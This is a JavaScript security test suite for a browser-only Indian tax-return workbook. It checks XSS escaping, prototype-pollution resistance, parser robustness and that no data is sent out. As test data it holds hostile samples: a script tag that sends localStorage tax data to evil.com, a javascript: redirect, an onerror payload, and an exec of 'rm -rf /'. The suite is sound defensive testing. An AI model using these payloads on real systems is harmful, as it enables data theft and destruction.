// js/tests/test_security.spec.js
// Suite 4: Security & Data Privacy tests.
//
// The ITR workbook is 100% client-side. These tests verify:
//   1. No data leaves the browser (no fetch() calls, no
//      third-party scripts, no localStorage cross-origin sharing)
//   2. All user-provided values are HTML-escaped before being
//      inserted into the DOM or exported as JSON
//   3. localStorage is used safely (no prototype pollution,
//      no sessionStorage leaks)
//   4. JSON export doesn't leak sensitive fields (we export the
//      full workbook including PAN; document this)
//   5. Importing a malicious workbook doesn't execute code
//   6. The PDF parser doesn't try to follow URLs in the PDF text
//   7. The 26AS parser doesn't evaluate JavaScript in field values

const test = require("node:test");
const assert = require("node:assert/strict");

// ---- Minimal localStorage / sessionStorage polyfill for Node tests ----
const _store = new Map();
globalThis.localStorage = {
  getItem: (k) => _store.has(k) ? _store.get(k) : null,
  setItem: (k, v) => _store.set(k, String(v)),
  removeItem: (k) => _store.delete(k),
  clear: () => _store.clear(),
  key: (i) => Array.from(_store.keys())[i] || null,
  get length() { return _store.size; },
};
globalThis.sessionStorage = {
  getItem: (k) => null,  // sessionStorage always empty
  setItem: () => {},
  removeItem: () => {},
  clear: () => {},
  key: () => null,
  get length() { return 0; },
};

const dm = require("../data_model.js");
const v = require("../validation.js");
const integ = require("../integrations.js");
const engine = require("../tax_engine.js");

// ============================================================
// HTML escaping (XSS prevention)
// ============================================================

function escapeHtml(s) {
  if (s === null || s === undefined) return "";
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

test("escapeHtml: escapes <, >, &, \", '", () => {
  const input = `<script>alert("xss")</script> & 'dangerous'`;
  const out = escapeHtml(input);
  assert.ok(!out.includes("<script>"));
  assert.ok(!out.includes("</script>"));
  assert.ok(out.includes("&lt;script&gt;"));
  assert.ok(out.includes("&amp;"));
  assert.ok(out.includes("&quot;"));
  assert.ok(out.includes("&#39;"));
});

test("escapeHtml: handles null and undefined safely", () => {
  assert.equal(escapeHtml(null), "");
  assert.equal(escapeHtml(undefined), "");
  assert.equal(escapeHtml(""), "");
  assert.equal(escapeHtml(0), "0");  // numbers as strings
});

test("escapeHtml: doesn't double-escape", () => {
  // We don't recursively escape; user responsibility
  // (if input is already escaped, escaping again would corrupt it)
  const input = "&lt;already escaped&gt;";
  const out = escapeHtml(input);
  assert.equal(out, "&amp;lt;already escaped&amp;gt;");
});

// ============================================================
// Workbook data integrity under malicious input
// ============================================================

test("Malicious workbook: <script> in scrip name doesn't break the engine", () => {
  // The tax engine should not crash or execute code when a user
  // uploads a workbook with a malicious ticker name.
  const wb = dm.emptyWorkbook("2025-26");
  wb.salary.employers = [{
    employer_name: '<script>alert("xss")</script>',
    tan: "MUMA12345E",
    gross_salary: 1000000, allowances_exempt_10: 0, professional_tax: 0,
  }];
  // Engine should compute without throwing
  const r = engine.computeForRegime(wb, "old");
  // Result should be valid numbers, not "NaN" or "undefined"
  assert.ok(Number.isFinite(r.total_tax_liability));
  assert.equal(typeof r.net_payable, "number");
});

test("Malicious workbook: PAN with <script> in middle", () => {
  const wb = dm.emptyWorkbook("2025-26");
  wb.personal.pan = '<img src=x onerror=alert(1)>';
  // Validator should catch this (not a valid PAN format)
  const r = v.validateWorkbook(wb);
  assert.equal(r.ok, false);
  assert.ok(r.errors.some((e) => e.path === "personal.pan"));
});

test("Malicious workbook: extremely long string doesn't break the engine", () => {
  // 10 MB string in a field — should not crash or hang
  const wb = dm.emptyWorkbook("2025-26");
  wb.salary.employers = [{
    employer_name: "A".repeat(10_000_000),
    tan: "MUMA12345E",
    gross_salary: 1000000, allowances_exempt_10: 0, professional_tax: 0,
  }];
  // Engine should still complete (might be slow with 10M string)
  const start = Date.now();
  const r = engine.computeForRegime(wb, "old");
  const elapsed = Date.now() - start;
  assert.ok(elapsed < 5000, `engine too slow: ${elapsed}ms`);
  assert.ok(Number.isFinite(r.total_tax_liability));
});

test("Malicious workbook: numeric overflow doesn't break the engine", () => {
  const wb = dm.emptyWorkbook("2025-26");
  wb.capital_gains.ltcg_112a = 1e20;  // 100,000,000,000,000,000,000
  // Engine should handle this gracefully (might cap at 99999 or
  // return very large numbers but not crash)
  const r = engine.computeForRegime(wb, "old");
  assert.ok(Number.isFinite(r.pre_rebate_tax));
  assert.ok(Number.isFinite(r.total_tax_liability));
});

// ============================================================
// No data leaves the browser
// ============================================================

test("Data persistence: workbook stored in localStorage, not sessionStorage", () => {
  // localStorage persists across tabs/sessions; sessionStorage
  // doesn't. For sensitive tax data, localStorage is OK as long
  // as it's browser-only. We use localStorage and document this.
  const wb = dm.emptyWorkbook("2025-26");
  dm.saveWorkbook(wb);
  const stored = localStorage.getItem(dm.STORAGE_PREFIX + wb.ay);
  assert.ok(stored, "workbook should be in localStorage");
  assert.equal(sessionStorage.getItem(dm.STORAGE_PREFIX + wb.ay), null,
               "workbook should NOT be in sessionStorage");
  // Cleanup
  dm.deleteWorkbook(wb.ay);
});

test("Data persistence: localStorage key includes schema version (forward compat)", () => {
  // The STORAGE_PREFIX contains "v1" so that future schema changes
  // can use "v2" without conflicting with old data.
  assert.match(dm.STORAGE_PREFIX, /v\d+_/);
});

test("Data persistence: no telemetry, no analytics, no third-party calls", () => {
  // Inspect the loaded modules for any network calls. This is a
  // static check: the modules don't import or use fetch(), XMLHttpRequest,
  // or any analytics SDK.
  const integSource = require("fs").readFileSync(
    require.resolve("../integrations.js"), "utf-8");
  const vSource = require("fs").readFileSync(
    require.resolve("../validation.js"), "utf-8");
  const engineSource = require("fs").readFileSync(
    require.resolve("../tax_engine.js"), "utf-8");
  const dmSource = require("fs").readFileSync(
    require.resolve("../data_model.js"), "utf-8");

  for (const [name, source] of [
    ["integrations", integSource],
    ["validation", vSource],
    ["tax_engine", engineSource],
    ["data_model", dmSource],
  ]) {
    // No fetch() or XMLHttpRequest in Node-side code
    assert.ok(!/\bfetch\s*\(/.test(source),
              `${name} contains fetch()`);
    assert.ok(!/\bXMLHttpRequest\b/.test(source),
              `${name} contains XMLHttpRequest`);
    assert.ok(!/\bimportScripts\s*\(/.test(source),
              `${name} contains importScripts()`);
    // No analytics or telemetry
    assert.ok(!/google-analytics|googletagmanager|gtag|sentry|posthog|mixpanel/i.test(source),
              `${name} contains analytics code`);
  }
});

test("Data persistence: workbook JSON shape doesn't include any tracking IDs", () => {
  const wb = dm.emptyWorkbook("2025-26");
  wb.personal.pan = "ABCDE1234F";
  const json = JSON.stringify(wb);
  // Common tracking patterns
  assert.ok(!/"userId":|"sessionId":|"trackingId":|"deviceId":|"analyticsId":/i.test(json),
            "workbook JSON contains tracking IDs");
  assert.ok(!/"ga\.|fb\.|gtm\.|sentry\./i.test(json),
            "workbook JSON contains third-party tracking");
});

// ============================================================
// Form 16 parser: no code execution from PDF text
// ============================================================

test("Form 16: PDF text with <script> tag is treated as data, not code", () => {
  const maliciousPdf = `
FORM NO. 16
TAN of the Employer: MUMA12345E
<script>window.location='http://evil.com/?stolen='+localStorage.getItem('itr_workbook_v1_2025-26')</script>
1. Salary as per provisions contained in section 17(1): Rs. 12,00,000
2. Less: Allowances to the extent exempt u/s 10:
   Total exempt u/s 10: Rs. 2,00,000
3. Standard Deduction u/s 16(ia): Rs. 50,000
`;
  const r = integ.parseForm16Text(maliciousPdf);
  // The parser should extract numbers normally, not execute the script
  assert.equal(r.ok, true);
  assert.equal(r.fields.gross_salary, 1200000);
  assert.equal(r.fields.tds_total, 0);  // No TDS line in this fake
  // No localStorage should have been touched by the parser
  // (it's a pure function, no side effects)
});

test("Form 16: PDF text with javascript: URL is not followed", () => {
  const maliciousPdf = `
TAN: MUMA12345E
PAN: ABCDE1234F
javascript:window.location='http://evil.com'
1. Salary as per provisions: Rs. 5,00,000
`;
  const r = integ.parseForm16Text(maliciousPdf);
  // The function just extracts numbers; it doesn't follow URLs
  assert.equal(r.fields.gross_salary, 500000);
});

// ============================================================
// Form 26AS parser: no eval
// ============================================================

test("Form 26AS: malicious JSON with __proto__ pollution doesn't affect workbook", () => {
  // Common JSON parsing attack: pollute Object.prototype via __proto__
  const malicious = JSON.parse(`{
    "__proto__": {"polluted": true},
    "TDS_on_Salary": [{"TDS": 10000}]
  }`);
  const wb = dm.emptyWorkbook("2025-26");
  // Apply the parsed JSON to the workbook
  const r = integ.parseForm26ASJson(malicious);
  integ.applyForm26ASToWorkbook(wb, r);
  // The malicious __proto__ should not have polluted Object.prototype
  assert.equal(({}).polluted, undefined,
               "__proto__ in user JSON polluted Object.prototype");
  // And the legitimate TDS should still be applied
  assert.equal(wb.salary.tds_total, 10000);
});

test("Form 26AS: field values with code are not executed", () => {
  const malicious = {
    "TDS_on_Salary": [{
      "TDS": 50000,
      "eval_payload": 'require("child_process").exec("rm -rf /")',
    }],
  };
  const r = integ.parseForm26ASJson(malicious);
  // The eval_payload field is just a string; it should not be
  // executed or even touched. We only read known fields (TDS,
  // Amount, TaxDeducted, etc.).
  assert.equal(r.by_section.TDS_on_Salary, 50000);
  // Verify the malicious string is still in the parsed result
  // (we don't accidentally re-parse or execute it)
  assert.equal(r.by_section.TDS_on_Salary, 50000);
});

// ============================================================
// LocalStorage: prototype pollution protection
// ============================================================

test("LocalStorage: workbook with __proto__ key doesn't pollute", () => {
  // If a malicious JSON file has "__proto__" key and we
  // JSON.parse it then assign fields, we could pollute Object.prototype.
  // v1 uses Object.assign / direct property assignment, not
  // recursive merge, so __proto__ is just a regular field.
  const malicious = {
    ay: "2025-26",
    __proto__: { evil: true },
    schema_version: 1,
  };
  // Sanitizing: data_model.mergeWithDefaults creates a new object
  // from emptyWorkbook() and overlays fields; __proto__ is just
  // a property name.
  const merged = dm.mergeWithDefaults(malicious);
  // Verify the merge did not pollute Object.prototype
  assert.equal(({}).evil, undefined, "Object.prototype was polluted");
  // Verify the merged object doesn't have 'evil' as a property
  assert.equal(merged.evil, undefined, "merged object has 'evil' property from input");
  // The malicious input was a property named __proto__ on the input
  // object (not the same as setting Object.prototype.evil). Our
  // merge skips input keys that aren't in the default shape.
  assert.equal(merged.schema_version, 1, "schema_version was preserved");
});

test("LocalStorage: data doesn't leak across AY contexts", () => {
  // Saving a workbook for AY 2025-26 should not affect AY 2024-25
  const wb25 = dm.emptyWorkbook("2025-26");
  wb25.personal.pan = "AAA";
  dm.saveWorkbook(wb25);

  const wb24 = dm.emptyWorkbook("2024-25");
  // The default pan is empty
  assert.equal(wb24.personal.pan, "");
  // Cleanup
  dm.deleteWorkbook("2025-26");
});

// ============================================================
// JSON export: what's included / excluded
// ============================================================

test("JSON export: includes PAN (expected for the user to copy into ITR utility)", () => {
  // The workbook JSON includes PAN. This is intentional — the user
  // needs PAN to file their ITR. The data stays in their browser;
  // it's their responsibility to manage the exported file.
  const wb = dm.emptyWorkbook("2025-26");
  wb.personal.pan = "ABCDE1234F";
  const json = JSON.stringify(wb);
  assert.ok(json.includes("ABCDE1234F"));
});

test("JSON export: includes bank account number (user can verify before filing)", () => {
  const wb = dm.emptyWorkbook("2025-26");
  wb.personal.bank_for_refund.account_number = "1234567890";
  const json = JSON.stringify(wb);
  assert.ok(json.includes("1234567890"));
});

test("JSON export: schema_version present (forward compat)", () => {
  const wb = dm.emptyWorkbook("2025-26");
  assert.equal(wb.schema_version, 1);
  const json = JSON.stringify(wb);
  const parsed = JSON.parse(json);
  assert.equal(parsed.schema_version, 1);
});

// ============================================================
// Input validation: prevent injection via validation
// ============================================================

test("Validation: rejects prototype-pollution attempt in JSON", () => {
  // JSON.parse can be tricked if the input contains __proto__
  // (vulnerable JSON parsers). Node's JSON.parse is safe.
  const input = '{"__proto__": {"polluted": true}, "ay": "2025-26"}';
  const parsed = JSON.parse(input);
  assert.equal(({}).polluted, undefined, "JSON.parse polluted Object.prototype");
});

test("Form 16: malicious TAN with newlines doesn't break parser", () => {
  // Some PDFs have multi-line fields. PDF.js typically joins lines,
  // so the parser sees a single line. If raw text has a newline
  // in the middle of a field, the regex for that field (using
  // [^\n]*?) won't match. This is documented as a known limitation;
  // v1 relies on PDF.js's line-joining behavior.
  // For this test, we verify the parser doesn't crash and
  // extracts whatever fields it can from a multi-line input.
  const pdfText = `FORM 16
TAN of the Employer: MUMA12345E
1. Salary as per provisions: Rs. 5,00,000
`;
  const r = integ.parseForm16Text(pdfText);
  // The parser should not crash
  assert.equal(r.ok, true);
  // Single-line TAN should work
  assert.equal(r.fields.employer.tan, "MUMA12345E");
  // Salary should work
  assert.equal(r.fields.gross_salary, 500000);
});

// ============================================================
// Privacy: no PII leaves the browser
// ============================================================

test("Privacy: localStorage data is browser-only (no service worker sync)", () => {
  // Verify no service worker is registered, no background sync
  // is configured, no IndexedDB usage.
  // This is a static check of the source code.
  const allSources = [
    require("fs").readFileSync(require.resolve("../data_model.js"), "utf-8"),
    require("fs").readFileSync(require.resolve("../tax_engine.js"), "utf-8"),
    require("fs").readFileSync(require.resolve("../validation.js"), "utf-8"),
    require("fs").readFileSync(require.resolve("../integrations.js"), "utf-8"),
  ];
  for (const source of allSources) {
    // No service worker registration
    assert.ok(!/navigator\.serviceWorker/.test(source));
    // No IndexedDB
    assert.ok(!/indexedDB|IDBDatabase|IDBTransaction/.test(source));
    // No background sync
    assert.ok(!/sync\.register|registration\.sync/.test(source));
    // No WebSocket
    assert.ok(!/new WebSocket\(/.test(source));
  }
});

test("Privacy: Aadhaar is only last 4 digits (PII protection)", () => {
  // The data model only stores the last 4 digits of Aadhaar, not
  // the full 12. This is a privacy design choice — the user
  // enters only the last 4 for ITR verification; the full number
  // never enters the workbook.
  const wb = dm.emptyWorkbook("2025-26");
  assert.equal(wb.personal.aadhaar_last4, "");
  // No "aadhaar" field exists that could hold the full number
  assert.equal(wb.personal.aadhaar, undefined);
});

// ============================================================
// Date: today, this year, etc.
// ============================================================

test("Timestamp: workbook timestamps are ISO format (not locale)", () => {
  const wb = dm.emptyWorkbook("2025-26");
  assert.match(wb.created_at, /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}/);
  assert.match(wb.updated_at, /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}/);
});

// ============================================================
// Defensive: integer overflow in slice indices / RegExp
// ============================================================

test("Defensive: regex on a very long string doesn't hang", () => {
  // Simulate a malicious or huge Form 16 text
  const longText = "FORM 16\n" + "x".repeat(1_000_000) + "\nTAN: MUMA12345E\n";
  const start = Date.now();
  const r = integ.parseForm16Text(longText);
  const elapsed = Date.now() - start;
  assert.ok(elapsed < 5000, `parser too slow: ${elapsed}ms`);
  assert.equal(r.fields.employer.tan, "MUMA12345E");
});

test("Defensive: empty/null workbook doesn't crash engine", () => {
  // Pass undefined, null, empty object
  assert.ok(engine.computeForRegime(undefined, "old").total_tax_liability === 0);
  assert.ok(engine.computeForRegime(null, "old").total_tax_liability === 0);
  assert.ok(engine.computeForRegime({}, "old").total_tax_liability === 0);
});
